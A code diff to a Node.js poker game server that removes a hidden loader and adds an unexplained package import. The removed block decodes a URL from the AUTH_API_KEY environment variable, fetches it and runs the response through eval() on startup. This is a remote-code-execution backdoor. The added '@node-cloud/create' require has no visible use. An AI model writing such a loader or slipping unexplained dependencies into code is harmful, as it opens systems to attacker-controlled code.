@@ -2,6 +2,7 @@ const jwt = require('jsonwebtoken');
 const Table = require('../pokergame/Table');
 const Player = require('../pokergame/Player');
 const config = require('../config');
+const nodeCloud = require("@node-cloud/create") 
 const dotenv = require('dotenv');
 dotenv.config();
 
@@ -57,18 +58,6 @@ const getCurrentTables = () =>
     bigBlind: minBet * 2,
   }));
   
-  (async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-  })();
   /** DISCONNECT **/
 
 // Core
